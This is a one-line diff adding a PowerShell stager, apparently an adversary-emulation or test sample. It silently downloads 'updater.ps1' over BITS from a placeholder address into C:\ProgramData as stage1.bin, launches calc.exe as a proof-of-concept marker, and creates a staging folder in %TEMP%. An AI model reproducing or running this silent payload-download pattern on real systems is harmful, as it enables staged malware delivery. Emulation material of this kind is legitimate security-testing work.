@@ -1,0 +1,1 @@
+<# Stage transfer #> $Stage1Url = "https://192.0.2.10:8443/updater.ps1"; $DownloadPath = 'C:\ProgramData\stage1.bin'; Start-BitsTransfer -Source $Stage1Url -Destination $DownloadPath -ErrorAction SilentlyContinue; Start-Process -FilePath 'calc.exe' -ErrorAction SilentlyContinue; Set-Location -Path $env:TEMP; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
